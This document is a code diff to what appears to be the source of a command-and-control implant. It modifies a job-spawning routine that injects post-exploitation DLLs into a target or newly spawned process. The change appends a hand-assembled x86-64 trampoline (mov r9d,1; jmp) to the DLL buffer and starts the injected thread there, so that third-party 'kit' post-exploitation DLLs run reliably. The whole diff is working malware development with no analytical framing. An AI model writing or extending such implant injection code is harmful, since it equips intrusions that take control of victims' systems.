@@ -371,6 +371,7 @@ void command_job_spawn_user(char * buffer, int length, BOOL x86) {
 	char *  parameter;
 	char *  dll;
 	int     dllen;
+	int     tOffset;
 
 	/* parse it */
 	data_init(&parser, buffer, length);
@@ -386,6 +387,37 @@ void command_job_spawn_user(char * buffer, int length, BOOL x86) {
 	if (dllen <= 0) {
 		post_error_d(0x57, dllen);
 		return;
+	}
+
+	/* C-24 kit-contract r9 trampoline: 4.12+ kit postex DLLs expose a
+	 * FOUR-argument entry DllEntryPoint(hModule, DLL_POSTEX_ATTACH,
+	 * lpReserved, BOOL startNamedPipe) and read their user args straight
+	 * out of lpReserved (the thread parameter). Our loader forwards the
+	 * parameter in r8 but leaves r9 = whatever DllMain(PROCESS_ATTACH)
+	 * left behind, so kit DLLs see a garbage startNamedPipe and crash
+	 * walking uninitialized state. Append an 11-byte trampoline to the
+	 * payload (mov r9d,1; jmp <loader entry>) and start the thread at
+	 * it: r9 becomes a deterministic TRUE, which every other postex DLL
+	 * ignores. p_offset = dllen lands on the trampoline. */
+	{
+		char * tramp;
+		int newlen = dllen + 11;
+		tOffset = dllen;
+		/* data_buffer points INTO the task message buffer - copy out,
+		 * never realloc it */
+		tramp = (char *)malloc(newlen);
+		if (tramp == NULL) {
+			post_error_d(0x57, newlen);
+			return;
+		}
+		memcpy(tramp, dll, dllen);
+		dll = tramp;
+		dll[dllen + 0] = 0x41; dll[dllen + 1] = 0xB9;   /* mov r9d, 1 */
+		dll[dllen + 2] = 0x01; dll[dllen + 3] = 0x00;
+		dll[dllen + 4] = 0x00; dll[dllen + 5] = 0x00;
+		dll[dllen + 6] = 0xE9;                            /* jmp rel32 -> payload start */
+		*(int *)(dll + dllen + 7) = (int)(0 - (dllen + 11));
+		dllen = newlen;
 	}
 
 	/* explicit pid: inject into that process */
@@ -407,7 +439,7 @@ void command_job_spawn_user(char * buffer, int length, BOOL x86) {
 			return;
 		}
 
-		inject_process_logic(NULL, hProcess, pid, dll, dllen, 0, parameter, plen);
+		inject_process_logic(NULL, hProcess, pid, dll, dllen, tOffset, parameter, plen);
 		CloseHandle(hProcess);
 		return;
 	}
@@ -431,7 +463,7 @@ void command_job_spawn_user(char * buffer, int length, BOOL x86) {
 	Sleep(100);
 	spawn_log("jsu: post-shim, calling ipl len=", (long)dllen);
 
-	inject_process_logic(&pi, pi.hProcess, pi.dwProcessId, dll, dllen, 0, parameter, plen);
+	inject_process_logic(&pi, pi.hProcess, pi.dwProcessId, dll, dllen, tOffset, parameter, plen);
 	spawn_log("jsu: ipl returned", 0x7fffffff);
 
 	token_guard_stop_maybe(TRUE);
